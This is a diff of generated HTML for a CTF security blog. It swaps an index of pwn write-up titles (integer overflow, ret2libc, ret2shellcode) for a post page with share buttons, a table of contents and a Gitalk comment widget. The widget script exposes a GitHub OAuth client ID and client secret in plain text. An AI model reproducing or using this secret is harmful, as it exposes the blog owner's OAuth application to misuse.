-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-pwn/pwn 整型溢出" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/09/pwn/pwn%20%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/">pwn 整型溢出</a>
-    </h1>
-  
-
-<!--显示阅读次数-->
-
-<!--显示阅读次数完毕-->
-        
-        <a href="/2021/03/09/pwn/pwn%20%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2021-03-09T08:09:25.439Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-09</time>
-</a>
-        <!-- 需要添加的位置 -->
-        <!-- 开始添加字数统计-->
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">519字</span>
-      </span>
+      </div>
     </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">2分</span>
-      </span>
-    </span>
+  </div>
 </div>
-          
-        <!-- 添加完成 -->
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>int_overflow 攻防世界<br>r2t3 BUU<br>overflow</p>
-        
-          <a class="article-more-a" href="/2021/03/09/pwn/pwn%20%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/#more">more >></a>
-        
-      
 
-
-
-
-
-      
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://qingmu-z.github.io/2021/04/27/ctf%E6%AF%94%E8%B5%9B/redpwn2020/" alt="微信分享二维码">
     </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">攻防世界</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">int_overflow</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/09/pwn/pwn%20%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-pwn/pwn ret2libc" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/04/pwn/pwn%20ret2libc/">pwn ret2libc</a>
-    </h1>
-  
-
-<!--显示阅读次数-->
-
-<!--显示阅读次数完毕-->
-        
-        <a href="/2021/02/04/pwn/pwn%20ret2libc/" class="archive-article-date">
-  	<time datetime="2021-02-04T15:22:22.193Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-04</time>
-</a>
-        <!-- 需要添加的位置 -->
-        <!-- 开始添加字数统计-->
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">2k字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">8分</span>
-      </span>
-    </span>
 </div>
-          
-        <!-- 添加完成 -->
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1.攻防世界 level3<br>2.buu babyrop<br>3.buu ciscn_2019_c_1</p>
-        
-          <a class="article-more-a" href="/2021/02/04/pwn/pwn%20ret2libc/#more">more >></a>
-        
-      
 
-
-
-
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ret2libc</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">攻防世界</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/04/pwn/pwn%20ret2libc/">展开全文 >></a>
-        </p>
-      
-
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2021/04/24/ctf%E6%AF%94%E8%B5%9B/HEROCTF%20WPICTF%202021%20pwn%E7%AD%BE%E5%88%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HEROCTF WPICTF 2021 pwn签到</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -1158,245 +450,51 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ctfhub/pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/04/ctfhub/pwn/">CTFhub pwn</a>
-    </h1>
-  
-
-<!--显示阅读次数-->
-
-<!--显示阅读次数完毕-->
-        
-        <a href="/2021/02/04/ctfhub/pwn/" class="archive-article-date">
-  	<time datetime="2021-02-04T09:53:31.804Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-04</time>
-</a>
-        <!-- 需要添加的位置 -->
-        <!-- 开始添加字数统计-->
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">579字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">2分</span>
-      </span>
-    </span>
-</div>
-          
-        <!-- 添加完成 -->
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1.ret2text<br>2.ret2shellcode</p>
-        
-          <a class="article-more-a" href="/2021/02/04/ctfhub/pwn/#more">more >></a>
-        
-      
-
-
-
-
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">CTFhub</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/04/ctfhub/pwn/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#coffer-overflow-0"><span class="toc-number">1.</span> <span class="toc-text">coffer-overflow-0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dead-canary"><span class="toc-number">2.</span> <span class="toc-text">dead-canary</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
   
-    <article id="post-攻防世界/pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/pwn/">攻防世界 pwn</a>
-    </h1>
   
 
-<!--显示阅读次数-->
-
-<!--显示阅读次数完毕-->
-        
-        <a href="/2021/02/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/pwn/" class="archive-article-date">
-  	<time datetime="2021-02-02T06:10:29.734Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-02</time>
-</a>
-        <!-- 需要添加的位置 -->
-        <!-- 开始添加字数统计-->
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">798字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
-        <span class="post-count" style="color:#ef7522;font-size:14px;">3分</span>
-      </span>
-    </span>
-</div>
-          
-        <!-- 添加完成 -->
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1.get_shell<br>2.when_did_you_born<br>3.hello_pwn<br>4.level0<br>5.level2<br>6.cgpwn2</p>
-        
-          <a class="article-more-a" href="/2021/02/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/pwn/#more">more >></a>
-        
-      
+  
 
 
-
-
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">攻防世界</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/pwn/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
+	<div id="gitalk-container"></div>
+	<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '33931d9e122463275cdd',
+        clientSecret: 'd5606411ea5f6bfd13d4a1603a38dc4f77046949',
+        repo: 'qingmu-z.github.io',
+        owner: 'qingmu-z',
+        admin: 'qingmu-z',
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    }).render('gitalk-container')
+</script>
 
 
   
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
-    </nav>
+
+
   
 
 
@@ -1430,8 +528,8 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
